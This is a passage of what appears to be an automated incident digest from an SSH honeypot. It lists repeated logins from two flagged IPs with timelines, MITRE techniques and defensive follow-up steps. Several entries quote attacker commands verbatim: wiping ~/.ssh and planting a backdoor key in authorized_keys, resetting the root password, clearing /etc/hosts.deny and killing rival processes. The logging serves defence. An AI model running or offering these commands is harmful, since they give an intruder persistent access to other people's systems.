| `2026-04-12 12:09:18` | `cowrie.command.failed` |
| `2026-04-12 12:09:19` | `cowrie.log.closed` |
| `2026-04-12 12:09:19` | `cowrie.session.params` |
| `2026-04-12 12:09:19` | `cowrie.command.input` |
| `2026-04-12 12:09:19` | `cowrie.session.file_download` |
| `2026-04-12 12:09:19` | `cowrie.log.closed` |
| `2026-04-12 12:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a94e1e79c64a

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:09 |
| **Last Seen** | 2026-04-12 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:09:22` | `cowrie.session.connect` |
| `2026-04-12 12:09:22` | `cowrie.client.version` |
| `2026-04-12 12:09:22` | `cowrie.client.kex` |
| `2026-04-12 12:09:23` | `cowrie.login.success` |
| `2026-04-12 12:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d8bde02cf47

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:10 |
| **Last Seen** | 2026-04-12 12:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:10:55` | `cowrie.session.connect` |
| `2026-04-12 12:10:55` | `cowrie.client.version` |
| `2026-04-12 12:10:55` | `cowrie.client.kex` |
| `2026-04-12 12:10:56` | `cowrie.login.success` |
| `2026-04-12 12:10:57` | `cowrie.session.params` |
| `2026-04-12 12:10:57` | `cowrie.command.input` |
| `2026-04-12 12:10:57` | `cowrie.command.failed` |
| `2026-04-12 12:10:57` | `cowrie.log.closed` |
| `2026-04-12 12:10:57` | `cowrie.session.params` |
| `2026-04-12 12:10:57` | `cowrie.command.input` |
| `2026-04-12 12:10:58` | `cowrie.session.file_download` |
| `2026-04-12 12:10:58` | `cowrie.log.closed` |
| `2026-04-12 12:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a7c268e7fbf

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:11 |
| **Last Seen** | 2026-04-12 12:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:11:01` | `cowrie.session.connect` |
| `2026-04-12 12:11:01` | `cowrie.client.version` |
| `2026-04-12 12:11:01` | `cowrie.client.kex` |
| `2026-04-12 12:11:02` | `cowrie.login.success` |
| `2026-04-12 12:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c13578cacf97

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:15 |
| **Last Seen** | 2026-04-12 12:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:15:58` | `cowrie.session.connect` |
| `2026-04-12 12:15:58` | `cowrie.client.version` |
| `2026-04-12 12:15:58` | `cowrie.client.kex` |
| `2026-04-12 12:15:59` | `cowrie.login.success` |
| `2026-04-12 12:15:59` | `cowrie.session.params` |
| `2026-04-12 12:15:59` | `cowrie.command.input` |
| `2026-04-12 12:15:59` | `cowrie.command.failed` |
| `2026-04-12 12:16:00` | `cowrie.log.closed` |
| `2026-04-12 12:16:00` | `cowrie.session.params` |
| `2026-04-12 12:16:00` | `cowrie.command.input` |
| `2026-04-12 12:16:00` | `cowrie.session.file_download` |
| `2026-04-12 12:16:00` | `cowrie.log.closed` |
| `2026-04-12 12:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a58d431aca3

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:16 |
| **Last Seen** | 2026-04-12 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:16:03` | `cowrie.session.connect` |
| `2026-04-12 12:16:03` | `cowrie.client.version` |
| `2026-04-12 12:16:03` | `cowrie.client.kex` |
| `2026-04-12 12:16:04` | `cowrie.login.success` |
| `2026-04-12 12:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17c450a4b773

| Field | Detail |
|---|---|
| **Source IP** | `180.76.104[.]44` |
| **First Seen** | 2026-04-12 12:17 |
| **Last Seen** | 2026-04-12 12:17 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Iy1SFKksQ65z"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:17:09` | `cowrie.session.connect` |
| `2026-04-12 12:17:09` | `cowrie.client.version` |
| `2026-04-12 12:17:11` | `cowrie.client.kex` |
| `2026-04-12 12:17:13` | `cowrie.login.success` |
| `2026-04-12 12:17:14` | `cowrie.session.params` |
| `2026-04-12 12:17:14` | `cowrie.command.input` |
| `2026-04-12 12:17:14` | `cowrie.command.failed` |
| `2026-04-12 12:17:14` | `cowrie.log.closed` |
| `2026-04-12 12:17:15` | `cowrie.session.params` |
| `2026-04-12 12:17:15` | `cowrie.command.input` |
| `2026-04-12 12:17:15` | `cowrie.session.file_download` |
| `2026-04-12 12:17:15` | `cowrie.log.closed` |
| `2026-04-12 12:17:25` | `cowrie.session.params` |
| `2026-04-12 12:17:25` | `cowrie.command.input` |
| `2026-04-12 12:17:26` | `cowrie.log.closed` |
| `2026-04-12 12:17:27` | `cowrie.session.params` |
| `2026-04-12 12:17:27` | `cowrie.command.input` |
| `2026-04-12 12:17:27` | `cowrie.log.closed` |
| `2026-04-12 12:17:28` | `cowrie.session.params` |
| `2026-04-12 12:17:28` | `cowrie.command.input` |
| `2026-04-12 12:17:34` | `cowrie.session.file_download` |
| `2026-04-12 12:17:34` | `cowrie.log.closed` |
| `2026-04-12 12:17:42` | `cowrie.session.params` |
| `2026-04-12 12:17:42` | `cowrie.command.input` |
| `2026-04-12 12:17:43` | `cowrie.log.closed` |
| `2026-04-12 12:17:44` | `cowrie.session.params` |
| `2026-04-12 12:17:44` | `cowrie.command.input` |
| `2026-04-12 12:17:44` | `cowrie.command.input` |
| `2026-04-12 12:17:45` | `cowrie.log.closed` |
| `2026-04-12 12:17:46` | `cowrie.session.params` |
| `2026-04-12 12:17:46` | `cowrie.command.input` |
| `2026-04-12 12:17:46` | `cowrie.log.closed` |
| `2026-04-12 12:17:46` | `cowrie.session.params` |
| `2026-04-12 12:17:46` | `cowrie.command.input` |
| `2026-04-12 12:17:47` | `cowrie.log.closed` |
| `2026-04-12 12:17:48` | `cowrie.session.params` |
| `2026-04-12 12:17:48` | `cowrie.command.input` |
| `2026-04-12 12:17:48` | `cowrie.log.closed` |
| `2026-04-12 12:17:52` | `cowrie.session.params` |
| `2026-04-12 12:17:52` | `cowrie.command.input` |
| `2026-04-12 12:17:52` | `cowrie.log.closed` |
| `2026-04-12 12:17:53` | `cowrie.session.params` |
| `2026-04-12 12:17:53` | `cowrie.command.input` |
| `2026-04-12 12:17:53` | `cowrie.log.closed` |
| `2026-04-12 12:17:54` | `cowrie.session.params` |
| `2026-04-12 12:17:54` | `cowrie.command.input` |
| `2026-04-12 12:17:54` | `cowrie.log.closed` |
| `2026-04-12 12:17:55` | `cowrie.session.params` |
| `2026-04-12 12:17:55` | `cowrie.command.input` |
| `2026-04-12 12:17:55` | `cowrie.log.closed` |
| `2026-04-12 12:17:56` | `cowrie.session.params` |
| `2026-04-12 12:17:56` | `cowrie.command.input` |
| `2026-04-12 12:17:56` | `cowrie.log.closed` |
| `2026-04-12 12:17:57` | `cowrie.session.params` |
| `2026-04-12 12:17:57` | `cowrie.command.input` |
| `2026-04-12 12:17:57` | `cowrie.log.closed` |
| `2026-04-12 12:17:58` | `cowrie.session.params` |
| `2026-04-12 12:17:58` | `cowrie.command.input` |
| `2026-04-12 12:17:59` | `cowrie.log.closed` |
| `2026-04-12 12:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.104[.]44` to AbuseIPDB if not already reported
- [ ] Block `180.76.104[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7354b191ec9e

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:17 |
| **Last Seen** | 2026-04-12 12:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:17:37` | `cowrie.session.connect` |
| `2026-04-12 12:17:37` | `cowrie.client.version` |
| `2026-04-12 12:17:37` | `cowrie.client.kex` |
| `2026-04-12 12:17:38` | `cowrie.login.success` |
| `2026-04-12 12:17:39` | `cowrie.session.params` |
| `2026-04-12 12:17:39` | `cowrie.command.input` |
| `2026-04-12 12:17:39` | `cowrie.command.failed` |
| `2026-04-12 12:17:39` | `cowrie.log.closed` |
| `2026-04-12 12:17:39` | `cowrie.session.params` |
| `2026-04-12 12:17:39` | `cowrie.command.input` |
| `2026-04-12 12:17:40` | `cowrie.session.file_download` |
| `2026-04-12 12:17:40` | `cowrie.log.closed` |
| `2026-04-12 12:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54861002be1b

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:17 |
| **Last Seen** | 2026-04-12 12:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:17:42` | `cowrie.session.connect` |
| `2026-04-12 12:17:42` | `cowrie.client.version` |
| `2026-04-12 12:17:43` | `cowrie.client.kex` |
| `2026-04-12 12:17:44` | `cowrie.login.success` |
| `2026-04-12 12:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db8124c595a9

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:19 |
| **Last Seen** | 2026-04-12 12:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:19:21` | `cowrie.session.connect` |
| `2026-04-12 12:19:21` | `cowrie.client.version` |
| `2026-04-12 12:19:22` | `cowrie.client.kex` |
| `2026-04-12 12:19:22` | `cowrie.login.success` |
| `2026-04-12 12:19:23` | `cowrie.session.params` |
| `2026-04-12 12:19:23` | `cowrie.command.input` |
| `2026-04-12 12:19:23` | `cowrie.command.failed` |
| `2026-04-12 12:19:23` | `cowrie.log.closed` |
| `2026-04-12 12:19:24` | `cowrie.session.params` |
| `2026-04-12 12:19:24` | `cowrie.command.input` |
| `2026-04-12 12:19:24` | `cowrie.session.file_download` |
| `2026-04-12 12:19:24` | `cowrie.log.closed` |
| `2026-04-12 12:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f47138d1663f

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:19 |
| **Last Seen** | 2026-04-12 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:19:27` | `cowrie.session.connect` |
| `2026-04-12 12:19:27` | `cowrie.client.version` |
| `2026-04-12 12:19:27` | `cowrie.client.kex` |
| `2026-04-12 12:19:28` | `cowrie.login.success` |
| `2026-04-12 12:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-999756e2ab31

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:21 |
| **Last Seen** | 2026-04-12 12:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:21:01` | `cowrie.session.connect` |
| `2026-04-12 12:21:01` | `cowrie.client.version` |
| `2026-04-12 12:21:02` | `cowrie.client.kex` |
| `2026-04-12 12:21:02` | `cowrie.login.success` |
| `2026-04-12 12:21:03` | `cowrie.session.params` |
| `2026-04-12 12:21:03` | `cowrie.command.input` |
| `2026-04-12 12:21:03` | `cowrie.command.failed` |
| `2026-04-12 12:21:03` | `cowrie.log.closed` |
| `2026-04-12 12:21:04` | `cowrie.session.params` |
| `2026-04-12 12:21:04` | `cowrie.command.input` |
| `2026-04-12 12:21:04` | `cowrie.session.file_download` |
| `2026-04-12 12:21:04` | `cowrie.log.closed` |
| `2026-04-12 12:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ab8f7bcc57d

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:21 |
| **Last Seen** | 2026-04-12 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:21:07` | `cowrie.session.connect` |
| `2026-04-12 12:21:07` | `cowrie.client.version` |
| `2026-04-12 12:21:07` | `cowrie.client.kex` |
| `2026-04-12 12:21:08` | `cowrie.login.success` |
| `2026-04-12 12:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37bfb584b70f

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:22 |
| **Last Seen** | 2026-04-12 12:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:22:41` | `cowrie.session.connect` |
| `2026-04-12 12:22:41` | `cowrie.client.version` |
| `2026-04-12 12:22:41` | `cowrie.client.kex` |
| `2026-04-12 12:22:42` | `cowrie.login.success` |
| `2026-04-12 12:22:42` | `cowrie.session.params` |
| `2026-04-12 12:22:42` | `cowrie.command.input` |
| `2026-04-12 12:22:42` | `cowrie.command.failed` |
| `2026-04-12 12:22:42` | `cowrie.log.closed` |
| `2026-04-12 12:22:43` | `cowrie.session.params` |
| `2026-04-12 12:22:43` | `cowrie.command.input` |
| `2026-04-12 12:22:43` | `cowrie.session.file_download` |
| `2026-04-12 12:22:43` | `cowrie.log.closed` |
| `2026-04-12 12:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-accf675883d6

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:22 |
| **Last Seen** | 2026-04-12 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:22:46` | `cowrie.session.connect` |
| `2026-04-12 12:22:46` | `cowrie.client.version` |
| `2026-04-12 12:22:46` | `cowrie.client.kex` |
| `2026-04-12 12:22:47` | `cowrie.login.success` |
| `2026-04-12 12:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-772ed4fdbd75

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:26 |
| **Last Seen** | 2026-04-12 12:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
